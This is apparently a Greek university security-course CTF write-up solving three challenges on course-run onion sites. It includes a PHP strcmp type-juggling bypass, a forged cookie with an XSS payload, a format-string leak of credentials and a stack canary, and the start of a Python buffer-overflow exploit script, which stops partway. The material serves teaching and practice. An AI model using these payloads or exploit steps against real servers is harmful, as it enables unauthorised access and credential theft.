# 2020-project-2-cybergh0sts

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 1 (_Finding George_)

1. Αρχικά, βρήκαμε με **View Page Source**, το σχόλιο που περιείχε το blog με τρόπους ασφάλισης ενός server

   > --> Link: https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d

<br/>

2. Από εκεί βρήκαμε ότι μπορούμε να χρησιμοποιήσουμε το **/server-info** για να δούμε πληροφορίες 
   σχετικές με τον server

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info
    
<br/>
    
3. Έτσι, μέσα στις πληροφορίες αυτές, βρήκαμε ότι στο server εξυπηρετούνται δύο ιστοσελίδες και πήραμε το 2<sup>ο</sup> .onion link

    > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/1-Served_Links.png) 
    >
    >
    > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/

<br/>

4. Μετά από το **/server-info** ξανά, του 2<sup>ου</sup> onion, βρήκαμε ότι έχουμε πρόσβαση σε όλα τα **.phps** files

   > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/2-Extensions_Granted_Access.png)
    
   Παρόμοια πληροφορία μπορούμε να πάρουμε και με ακόμα έναν τρόπο. Μέσα στο **/robots.txt** αναγράφεται το εξής
   
   > Disallow: /\*.phps
   
   που δηλώνει ότι ο server δε θέλει τα Web Robots που θα διαβάσουν αυτό το αρχείο, να επισκεφθούν σελίδες με κατάληξη **.phps**.
   Αυτό άμεσα μας δηλώνει ότι κάπου στο server ενδεχομένως να υπάρχει κάποιο php source file, από το οποίο μπορούμε να δούμε το 
   back end της αντίστοιχης σελίδας. [<sup>[1]</sup>](#1--httpswwwrobotstxtorgrobotstxthtml)

<br/>

5. Μετά, πατώντας το _Submit_ που είχε στη φόρμα, μας ανακατεύθυνε στη σελίδα **/access.php** με μήνυμα λάθους. 
   
   <ul>
   <li>Αρχικά σκεφτήκαμε να προσπαθήσουμε με <b>SQL Injection</b> να αντλήσουμε δεδομένα από τη βάση.</li>
   <li>Στη συνέχεια, εφόσον είδαμε ότι δεν μπορούμε να κάνουνμε κάτι με αυτό το attack, ψάξαμε στο <b>/server-info</b> αυτού του 
      onion και βρήκαμε αυτά που αναφέρονται στο 4.</li>
   <li>Τότε, δοκιμάσαμε να βάλουμε στο url το <b>access.phps</b> και μας εμφάνισε το source code του.</li>
   </ul><br/>
   
   > &emsp;&nbsp;&nbsp; --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps
   
<br/>

6. Διαβάζοντας τον κώδικα βρήκαμε πώς να βρούμε το <b>username</b>. Φτιάξαμε το παρακάτω script που το υπολόγιζε και βρήκαμε την τιμή 
   του $user (= 1337) \[leet 😉\]
   
   ```python
   cnt = 0
   i   = 0
   while True:
       if '7' in list(str(i*7)):
           cnt = cnt + 1

       if cnt == 48:
           print(i*7)
           break

       i = i + 1
   ```
   Στη συνέχεια, είδαμε ότι έχει και έναν 2<sup>ο</sup> ελεγχο που πρέπει να παρακάμψουμε. Έπρεπε το μήκος του username να είναι ίσο με 
   **7**. Έτσι απλά προσθέσαμε **3** χαρκατήρες + οι οποίοι αγνοούνται και περάσαμε τον πρώτο έλεγχο.
   
   <h6> <i> Σημείωση: Οποιουσδήποτε 3 χαρακτήρες και να βάλουμε που είναι γράμματα και όχι ψηφία περνάμε τον έλεγχο. </i> </h6>

<br/>

7. Μετά είδαμε ότι, για να πιστοποιηθεί το $password, χρησιμοποιείται μια **strcmp()**, της οποίας το ένα εκ των δύο ορισμάτων το 
   ελέγχουμε εμείς. 
   
   Ακόμα, ο έλεγχος που κάνει η php για το αποτέλεσμα της `strcmp()`, είναι **loose comparison (!=)** και όχι **strict (!==)**, 
   που σημαίνει ότι μπορεί να παρακαμφθεί πολύ πιο εύκολα. Ακολούθως παρατίθενται δύο πίνακες αληθείας για τα δύο είδη συγκρίσεων.
   
   |  |  |
   |--|--|
   | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/strict-comparison.png) | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/loose-comparison.png) |
   
   <!-- <h4> <b> Strict Comparison Mode (=== , !===) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |1       | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | FALSE |
   |array() | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  **TRUE**   | FALSE | FALSE |
   |"php"   | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | **TRUE**  | -->
   
   <!-- <h4> <b> Loose Comparison Mode (== , !==) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |1       | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  FALSE  | **TRUE**  | **TRUE**  |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | **TRUE**  | FALSE | ***TRUE***  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |array() | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | FALSE |
   |"php"   | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | **TRUE**  | -->
   
   Όπως φαίνεται εύκολα από το 2<sup>ο</sup> πίνακα, με βάση το **type juggling** που πραγματοποιεί η php, το **NULL** γίνεται evaluated
   ως 0 και έτσι η σύγκριση **NULL == 0** επιστρέφει ***TRUE***. [<sup>\[2\]</sup>](#2--httpsowasporgwww-pdf-archivephpmagictricks-typejugglingpdfpage33)[<sup>\[3\]</sup>](#3--httpswwwdoylernetsecurity-not-includedbypassing-php-strcmp-abctf2016)
   
   Άρα έπρεπε να βρούμε τρόπο να κάνουμε το όρισμα που ελέγχουμε, να μετατραπεί σε **empty array**, καθώς δίνοντας στην `strcmp()` σαν 
   όρισμα τον κενό πίνακα, επιστρέφει **NULL**!
   
   Έτσι, βρήκαμε ότι η php μετατρέπει τα **POST** και **GET** variables της μορφής **pass\[\]=**, σε **Empty Arrays**. 
   
   Συνεπώς, το μόνο που χρειαζόταν για να σπάσουμε τον έλεγχο, ήταν να δώσουμε σαν paylaod: **password\[\]**
   
   Άρα, το ολοκληρωμένο payload που χρειαζόμαστε για να περάσουμε τους ελέγχους είναι: **user=1337+++&password\[\]**
   
   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=1337+++&password[]

<br/>

8. Μετά από το **/blogposts7589109238** που μας έδωσε η καινούργια σελίδα, πήγαμε στην **/blogspots** και μέσω του indexing 
   που δεν είχε ασφαλίστει, βρήκαμε το αρχείο **post3.html** που περιείχε την πρώτη αναφορά στον Γιώργο και διάφορα άλλα στοιχεία.

   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/

<br/>

9. Από εκεί είδαμε να αναφέρεται το εξής: **"Winner Visitor #100013"** και θυμηθήκαμε ότι είχαμε δει το **Visitor** σαν Name στο
   cookie της αρχικής σελίδας (http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/) που μας 
   είχε δοθεί και υποψιαστήκαμε ότι θα χρησιμοποιηθεί κάπου εκεί.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/3-Cookie_Name.png)
    
   Διαγράφοντας το cookie που έχει και κάνοντας reload είδαμε ότι στη θέση του 204 εμφανίζει **"Bad sha256"**.
   Τότε σκεφτήκαμε ότι το value του cookie καθορίζει το τι θα εκτυπωθεί στη θέση του 204.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/4-Cookie_BadSHA256.png)
   
   Είδαμε ότι το value του cookie τελειώνει σε %3D που είναι το (=) σε URL encoded μορφή και βρήκαμε ότι αυτό
   είναι format που συμφωνεί με την κωδικοποίηση base64. [<sup>\[4\]</sup>](#4--httpsstackoverflowcomquestions6916805why-does-a-base64-encoded-string-have-an-sign-at-the-end)
   
   Κάνοντας decrypt το: **MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE=** \
   είδαμε ότι παράγει το: **204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a**
   
   Μετά κάναμε hashing του 204 με το sha-256 και είδαμε ότι παράγει το 2ο κομμάτι του decrypted base64.

   Άρα κατασκευάσαμε εν τέλει το καινούργιο value για το cookie σύμφωνα με τη συνάρτηση: base64( id:sha256(id) )

   Έτσι παράχθηκε το: **MTAwMDEzOjM2MjA5NTQyMzYyNzg3ZjIyMDU0MTgyYzNlNDE0MDlmZDFiMDQ4NmVjYjI4MmMwMmRjNTdiNGY5OGU0N2RlNzA=**

   Βάζοντας το στο cookie, λοιπόν, εμφανίστηκε η κρυφή τοποθεσία του καταλόγου με τα backups από το κινητό του Γιώργου 
   **/sekritbackups2444**.

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/
   
   
   #### Bonus!
   
   Ακουλουθώντας την παραπάνω διαδικασία μπορέσαμε και κάναμε **XSS attack** στο site.
   
   Έτσι, με payload: **<script\>alert(1)</script\>**, μετατρέποντας το σε **sha256** και μετά σε **base64**, εμφανίστηκε το alert message
   στη σελίδα.
   
   Payload: **PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjo1YzE0MGQzNWRjYjQ2YTYyMmUyY2VkZjVlZjVjYzM2MzhjZGZmZDFjMTE4YzkzMzFmOGM4NDY2OWYwYjc0Nzgz**

   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/5-Cookie_XSS.png)
   
<br/>

10. Από το καινούργιο path που βρήκαμε, κατεβάσαμε όλα τα αρχεία.
    
    Βρήκαμε μέσα στο **passphrase.key.truncated**, το πρώτο μέρος του hash του κωδικού με τον οποίο εγινε το _gpg encryption_.
    
    Ακολουθώντας τις οδηγίες, πήραμε το secret **"raccoon"** που αναφερόταν στο 2<sup>ο</sup> onion και δοκιμάσαμε όλες τις ημερομηνίες 
    τελευταίας τροποποίησης των **.truncated** και των υπολοίπων αρχείων και εκείνες που αναφέρονταν στα κείμενα, αλλά επειδή καμία δεν 
    έκανε την αποκρυπτογράφηση, φτιάξαμε το παρακάτω script που έκανε ένα _mini brute force_ με ημερομηνίες από 2020-01-01 -> 2020-06-31
    (καθώς η τελευταία τροποίηση αρχείου αρχείου και των δύο onion είναι στις 2020-06-xx) και βρήκαμε τελικά τη σωστή ημερομηνία.
    
    ```python
    from hashlib import sha256

    for i in range(1,7):
       for j in range(1,32):
          passphrase = "2020-0" + str(i) + "-"

          if j < 10:
             passphrase = passphrase + "0" + str(j)
          else:
             passphrase = passphrase + str(j)
             passphrase = passphrase + " raccoon"
             key = sha256(passphrase.encode('utf8').rstrip()).hexdigest()

             if "d1689c23e86421529297" in key:
                print(passphrase)
                print(key)
                exit()
    ```

    Ελέγχαμε αν το κομμάτι του hash που είχε το _truncated file_ περιέχεται σε αυτό που φτιάξαμε και εύκολα βρίσκουμε
    την ημερομηνία να είναι: **2020-02-12**

    Έτσι έχοντας όλο το passphrase και κάνοντας το hashing μπορούμε να κάνουμε decrypt τα .gpg αρχεία. \
    **passphrase**: 2020-02-12 raccoon \
    **hash**&emsp;&emsp;&nbsp;&nbsp;&nbsp;: d1689c23e86421529297f3eb35db2fe261de9cbe19487d923c464d96ca00e138

<br/>

11. Ανοίγωντας το **signal.log** βρίσκουμε την αναφορά στο commit με αριθμό: **2355437c5f30fd2390a314b7d52fb3d24583ef97**
    
    Παρόλο που σίγουρα κάποιο ρόλο θα διαδραμάτιζε και το **firefox.log**, αρχικά αρχίσαμε να ψάχνουμε τα repos των καθγητών και των 
    βοηθών μέχρι που βρήκαμε το αντίστοιχο commit με το ίδιο hash.
    
    Eν τέλει, προφανώς και υπήρχε και στο αρχείο **firefox.log**, που με ένα `search github` έβγαζε το λινκ απευθείας ή μέσω
    terminal εκτελώντας: `sort firefox.log | uniq` ή `grep github firefox.log`, εμφάνιζε το link του github.

      > \>\> sort firefox.log | uniq \
      >      https://en.wikipedia.org/wiki/The_Conversation \
      >      https://github.com/asn-d6/tor

      > \>\> grep github firefox.log \
      >      https://github.com/asn-d6/tor

<br/>

12. Τέλος, βρίσκοντας το commit αυτό, βρίσκαμε τις τελικές οδηγίες για την εύρεση της τοποθεσίας του Γιώργου. 
    Ακολουθώντας εύκολα πλέον τα 4 βήματα που είχε μέσα κατασκευάσαμε με ένα script τις συντεταγμένες του και ολοκληρώσαμε το ερώτημα!
    
    ```python
    from hashlib import sha256

    key = sha256(b"cybergh0sts").hexdigest()

    x = "0." + str(key[:16])
    y = "0." + str(key[16:32])

    mult = 1/16
    lat  = 0.0
    long = 0.0
    for i in range(2,18):
        lat  = lat  + int(x[i],16) * mult
        long = long + int(y[i],16) * mult
        mult = mult / 16

    print("Latitude : %.30lf"%lat)
    print("Longitude: %.30lf"%long)
    ```

    **Location**&nbsp;&nbsp;: Vaux-Saules, 21440, France\
    **Latitude**&nbsp;&nbsp;&nbsp;: 47.47298416481722560089\
    **Longitude**: &nbsp;&nbsp;4.7991375472458345437

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 2 (Missing part for completing Plan X)

1. Αρχικά εγκαταστήσαμε τοπικά τον **pico server** και κατά το compilation εμφανίστηκε ένα warning που μας έδωσε το 1<sup>ο</sup> βήμα 
   για το attack που πρέπει να κάνουμε.
   
   &emsp; ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/6-FSA_Warning.png)
    
<br/>

2. Μετά διαβάζοντας και το αντίστοιχο κομμάτι κώδικα και έπειτα από σχετική αναζήτηση, βρήκαμε ότι ένα πολύ ισχυρό attack που μπορεί να 
   γίνει σε μια τέτοια ***printf***, είναι το **Format String Attack**. [<sup>\[5\]</sup>](#5--httpsowasporgwww-communityattacksformat_string_attack)[<sup>\[6\]</sup>](#6--httpscs155stanfordedupapersformatstring-12pdfpage11)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/7-Format_String_attack.png)
   
<br/>

3. Μέσω αυτού, μπορούμε να κάνουμε reveal τα περιεχόμενα ολόκληρου του stack. Έτσι, μπορέσαμε να εκτυπώσουμε τα περιεχόμενα του πίνακα 
   που δίνεται σαν όρισμα στην `check_auth()` (Line users\[\]), ο οποίος περιέχει το username και το password που έχει φορτωθεί από το 
   αρχείο **/etc/htpasswd**. 
   
<br/>

4. Μέσω του ***gdb*** βρήκαμε τα offsets που χρειαζόμαστε για να προσπελάσουμε τα περιεχόμενα της θέσης μνήμης στη stack στην οποία είναι 
   αποθηκευμένες οι παραπάνω πληροφορίες.
   
   Είδαμε ότι τα δύο ορίσματα της `check_auth()` αποθηκεύονται από τις θέσεις: **$ebp + 0x8** (***Line users\[\]***) και **$ebp + 0xc** 
   (***auth_header***), στο κάτω μέρος του stack frame της συνάρτησης, στις θέσεις: **$ebp - 0x5c** και **$ebp - 0x60** αντιστοίχως.
   
   <h6>Σημείωση: Το stack frame έχει αρχικοποιηθεί με <b>0x64 = 100 bytes</b></h6>
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/8-Arguments_Copy.png)
   
<br/>

5. Στη συνέχεια βρήκαμε, ότι η μεταβλητή **auth_username**, που δίνεται σαν όρισμα στην `printf()` την οποία θα εκμεταλλευτούμε, 
   αποθηκεύεται στη θέση: **$ebp - 0x40**. 
   
   Άρα υπολογίζοντας το **offset** μεταξύ αυτών των θέσεων βρήκαμε ότι βάζοντας σαν payload: **%7$s**, θα μας επιστρέψει το περιεχόμενο
   του πίνακα **users\[\]**.
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/9-FSA_Arg_Position.png)
   
<br/>

6. Το αποτέλεσμα του request μας εμφανίζεται στους Mozilla και Tor Browsers στο prompt που δώσαμε, αλλά και στα **Response Headers**.
     
   Έτσι πήραμε το εξής response: **admin:f68762a532c15a8954be87b3d3fc3c31**

   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/10-Prompt_FSA_Results.png)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/11-Headers_FSA_Results.png)

<br/>

7. Στη συνέχεια μέσω κάποιων online ***md5 databases***, βρήκαμε το decryption του hashed password που είναι: **you shall not pass**.
   
   Έτσι, περάσαμε τον αρχικό έλεγχο και πήραμε το **index.html**, που περιείχε πληροφορίες για το ***Missing Part for Plan X***!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/12-Plan_X.png)|
   |-|

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 3 (Preliminary Results of Plan Y)

1. Αρχικά και εδώ, ξεκινήσαμε δοκιμάζοντας να κάνουμε κάποιο **SQL Injection** για να παρακάμψουμε τον έλεγχο.

2. Στη συνέχεια, ξαναδιαβάζοντας τον κώδικα, είδαμε πως υπάρχει ένας πίνακας **admin_pwd[1]** που έχει το ίδιο όνομα με το όνομα του 
   prompt που υπάρχει στη σελίδα του 3<sup>ου</sup> .onion link.
   
   Βλέποντας και το περιεχόμενο της συνάρτησης `post_param()` που καλείται αμέσως μετά, είδαμε ότι γίνεται ένα ***memcpy*** με μέγεθος όσο
   το εκάστοτε payload και παράλληλα μετατρέπονται τα **&**,**=** σε **\0** χαρακτήρες. Έτσι, καταλάβαμε ότι πρέπει να κάνουμε **Buffer Overflow**!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/13-Prompt_Name.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/14-Pico_SameName_Array.png)|
   |-|-|
<br/>

3. Πρώτα έπρεπε να βρούμε τις μεθόδους ασφαλείας που χρησιμοποιεί ο server, πληροφορίες σχετικές με το πώς έγινε το build και πληροφορίες για
   το σύστημα στο οποίο έγινε. 
   
   Διαβάζοντας το Makefile είδαμε ότι δε γίνεται κάποια απενεργοποίηση των **stack-protectors (canaries)**, του **ASLR** και ενεργοποίηση του 
   **Executable Stack** οπότε καταλάβαμε ότι θα ήταν ενεργοποιημένα. [<sup>\[7\]</sup>](#7--httpsenwikipediaorgwikiStack_buffer_overflowProtection_schemes)
   
   - Mέσω του gdb επιβεβαιώσαμε ότι χρησιμοποιούνται **canaries** για να διασφαλιστούν οι συναρτήσεις που περιέχουν πίνακες και μάλιστα 
     χρησιμοποιούνται ***Random Terminator Canaries*** που προσφέρουν μεγαλύτερη ασφάλεια όταν γίνεται χρήση κάποιας `strcpy()`.
   
   - Κάνοντας 2-3 φορές το **Format String Attack (FSA)** που περιγράφηκε στο Part_2, επιβεβαιώσαμε και την ύπαρξη του **ASLR**.
   
   - Στη δελίδα που μπήκαμε περνόντας το Βήμα 2, περιέχονταν πληροφορίες σχετικές με το σύστημα στο οποίο έγινε το build του pico server, της 
     έκδοσης του gcc που χρησιμοποιήθηκε και το όνομα του μηχανήματος στο οποίο έγινε.
     
     |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/15-Pico_Server_Build_Info.png)|
     |-|
     
   - Πηγαίνοντας στο μηχάνημα **linux02**, μέσω της εντολής `lscpu` βρήκαμε ότι πρόκειται για ***Little Endian*** σύστημα.
   
     ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/16-System_Endian.png)
     
<br/>

4. Οι πρώτες σκέψεις, ήταν με το BOF να κάνουμε override το περιεχόμενο του πίνακα **admin_pwd[1]** και να γράψουμε μέσα έναν δικό μας κωδικό
   τον οποίο και θα επέστρεφε η `post_param()` για να καταφέρουμε να περάσουμε τον έλεγχο που έχει στη συνέχεια.
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/17-Password_Checking.png)
<br/>

5. Έπειτα είδαμε ότι μπορούμε να κάνουμε κάτι πιο εύκολο στην υλοποίηση, όπως το να αλλάξουμε τη διεύθυνση επιστροφής της `post_param()` και να 
   την πάμε στο σημείο που εμείς θέλουμε. Εν προκειμένω, να καλέσουμε την **`serve_ultimate()`** ώστε να μας στείλει το _ultimate.html_.
<br/>

6. Στην αρχή προσπαθήσαμε να βρούμε τρόπο να παρακάμψουμε τα ***canaries***. \
   Σκεφτήκαμε ότι στην έκδοση gcc-5.4 υπάρχουν γνωστά vulnerabilities που θα μπορούσαμε να εκμεταλλευτούμε. [<sup>\[8\]</sup>](#8--httpswwwcvedetailscomvulnerability-listvendor_id-72product_id-960version_id-219995gnu-gcc-54html) \
   Βρήκαμε ότι όντως υπάρχει ένα security vulnerability το οποίο θα μας επέτρεπε να περάσουμε τον έλεγχο του stack guard canary.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/18-GCC_5.4_Security_Vulnerability.png)|
   |-|
<br/>

7. Στη συνέχεια σκεφτήκαμε πως εφόσον βρισκόμαστε σε **x32** αρχιτεκτονική τότε θα μπορούσαμε να κάνουμε _brute force_ ώστε να βρούμε την τιμή 
   του και να την επαναφέρουμε μέσω του BOF για να μην προκύψει ***stack smashing***, κάτι που ενισχύεται δεδομένου ότι έχουμε να κάνουμε με 
   **Termiantor Canaries** (eg. 0xYYYYYY**00**), που σημαίνει ότι μειώνεται ακόμα περισσότερο ο χώρος αναζήτησης του _brute forcing_ [<sup>\[9\]</sup>](#9--httpsctf101orgbinary-exploitationstack-canariesbruteforcing-a-stack-canary)
   
   Έτσι κάνοντας brute force byte per byte, θα χρειαζόμασταν το πολύ 3\*255 = **765** προσπάθεις, κάτι που είναι αποδεκτό για ένα τέτοιο attack.
<br/>

8. Ωστόσο, υπάρχουν και άλλοι πιο εύκολοι τρόποι για να επιτευχθεί το παρόν attack και γι'αυτό συνεχίσαμε χωρίς να εκμεταλλευτούμε το παραπάνω κενό 
   ή κάνοντας brute force.
   
   Μέσω του gdb και μετά από σχετική αναζήτηση, βρήκαμε ότι τα συγκεκριμένα canaries είναι **Random Terminator Canaries** και έτσι καταλάβαμε το
   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[10\]</sup>](#10--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[11\]</sup>](#11--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[12\]</sup>](#12--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[13\]</sup>](#13--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)[<sup>\[14\]</sup>](#14--httpswwwblackhatcompresentationsbh-usa-04bh-us-04-silbermanbh-us-04-silberman-paperpdfpage6)

   Βρήκαμε δηλαδή ότι παράγονται κατά το initialization του server και παραμένει ίδιο για κάθε κλήση συνάρτησης που περιέχει κάποιον πίνακα.

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/19-Random_Terminator_Canaries.png)

   Αυτό άμεσα δηλώνει ότι μπορούμε να κάνουμε leak την τιμή του canary της **`check_auth()`** μέσω του **FSA** που μπορούμε να κάνουμε εκεί και να το 
   χρησιμοποιήσουμε για να "επαναφέρουμε" την τιμή του canary της **`post_param()`**.

   Έτσι, διαβάζοντας την assembly μέσω του gdb βρήκαμε ότι το canary αποθηκεύεται στη θέση **$ebp - 0xC**. 

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/20-Stored_Canary.png)

   Γι'αυτό έπρεπε να υπολογίσουμε το **offset** από τη μεταβλητή ***auth_username*** η οποία χρησιμοποιείται για το **FSA**. \
   Αρχικά, βρήκαμε το offset μεταξύ του **ορίσματος** της `printf()` και του **ebp** της `check_auth()`, που είναι ίσο με: **0x78 = 30\*4 = 120 bytes**. \
   Αρα, ξέραμε άμεσα ότι το canary βρίσκεται **0xC** bytes πιο χαμηλά από τον ebp, αρα είχαμε το offset ίσο με: **0x6C = 27\*4 = 108 bytes**.

   Έτσι, κάνοντας αρχικά ένα request οπως αυτό του Part_2 με payload: **%27$x** παίρνουμε την τιμή του canary!

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/21-Canary_Value.png)

<br/>

9. Επειτα, υπολογίσαμε το offset της διεύθυνσης της εντολής που καλεί την **`serve_ultimate()`** από την πραγματική _return address_ της `check_auth()`, 
   το οποίο είναι ίσο με: **0x145**. _(Παρακάτω παρατίθεται και ο σχετικός κώδικας που πραγματοποιεί το attack)_
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/22-Check_Auth_Ret.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/23-Call_Serve_Ultimate.png)|
   |-|-|
   
   Στην αρχή πηγαίναμε στο Tor και παίρναμε τα δεδομένα που χρειαζόμασταν μέσω του **FSA**, έπειτα φτιάχναμε το payload σε binary μορφή, το αποθηκεύαμε 
   σε αρχείο και χρησιμοποιούσαμε το **Postman** για να κάνουμε το request, αλλά στη συνέχεια αυτοματοποιήσαμε όλη τη διαδικασία φτιάχνοντας ένα python script.
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(srv_ulti)
   ...
   ```
   
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
